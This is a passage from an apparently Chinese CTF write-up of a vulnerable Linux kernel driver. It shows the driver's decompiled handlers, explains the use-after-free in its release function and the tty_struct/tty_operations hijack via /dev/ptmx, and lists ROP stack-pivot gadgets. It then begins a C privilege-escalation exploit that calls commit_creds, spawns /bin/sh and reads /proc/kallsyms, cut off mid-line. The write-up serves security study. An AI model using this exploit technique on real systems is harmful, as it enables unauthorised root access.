class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl"></a>babyioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command, arg);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">65537</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">37748928LL</span>);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">37748928LL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease"></a>babyrelease</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, (_DWORD)filp, v2);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen"></a>babyopen</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, (_DWORD)filp, v2);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">37748928LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length, offset);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="babyread"><a href="#babyread" class="headerlink" title="babyread"></a>babyread</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length, offset);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到漏洞十分的明显，那就是<code>release</code>函数对堆块进行<code>free</code>操作后没有对指针进行判空，造成了<code>UAF</code>漏洞，我们可以同时打开<code>2</code>次<code>babydev</code>，再<code>release</code>第一个，即可以对第二个进行对<code>UAF</code>漏洞的利用<br>可是我们要怎么控制程序流呢？这时候我们就要关注<code>tty_struct</code>这一个结构体</p><h4 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty_struct"></a>tty_struct</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line">    <span class="type">spinlock_t</span> flow_lock;</span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>       <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>     <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;      <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>可以看到该结构体存在一个<code>tty_operations</code>指针</p><h4 id="tty-operations"><a href="#tty-operations" class="headerlink" title="tty_operations"></a>tty_operations</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>可以看到该结构体就像是我们<code>glibc</code>中<code>IO_file</code>的虚表一样，我们可以通过修改里面的函数指针来劫持程序流<br>该结构体会在<code>open /dev/ptmx</code>时被创建<br>这里采用的是<code>ret2usr</code>，我们可以先利用<code>UAF</code>将<code>tty_struct</code>给读取出来，然后在其<code>ops</code>的地方写入我们伪造的<code>tty_operations</code>的地址，在伪造的<code>tty_operations</code>偏移为1的位置写入我们<code>rop</code>链的地址。当我们对<code>/dev/ptmx</code>进行<code>write</code>操作时，程序会调用<code>tty_operations</code>偏移为<code>7</code>的地方的函数指针，通过调试我们可以看到此时的<code>rax</code>的值刚好为我们伪造的<code>tty_operations</code>结构体的地址，此时我们可以利用下面这条<code>gadget</code>：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff8181bfc5: mov rsp, rax; dec ebx; jmp 0xffffffff8181bf7e;</span><br><span class="line">0xffffffff8181bf7e: ret;</span><br></pre></td></tr></table></figure><p>来实现栈迁移，其效果很明显，即<code>rsp</code>来到了<code>tty_operations</code>上，此时再次利用下面两条<code>gadget</code>：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff8100ce6e: pop rax, ret</span><br><span class="line"></span><br><span class="line">0xffffffff8181bfc5: mov rsp, rax; dec ebx; jmp 0xffffffff8181bf7e;</span><br><span class="line">0xffffffff8181bf7e: ret;</span><br></pre></td></tr></table></figure><p>即可令<code>rsp</code>来到我们的<code>rop</code>链上，此时即可执行我们的<code>rop</code>链来实现提权</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>      </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff810d238d</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rax_ret = <span class="number">0xffffffff8100ce6e</span>;</span><br><span class="line"><span class="type">size_t</span> mov_cr4_rdi_pop_rbp_ret = <span class="number">0xffffffff81004d80</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rsp_rax_dec_ebx_ret = <span class="number">0xffffffff8181bfc5</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_pop_rbp_ret = <span class="number">0xffffffff81063694</span>;</span><br><span class="line"><span class="type">size_t</span> iretq_ret = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="type">size_t</span> ret = <span class="number">0xffffffff813659b6</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_sp),<span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)( (*pkc)(<span class="number">0</span>) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_stats();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取函数的地址</span></span><br><span class="line">    FILE* sym_table_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span 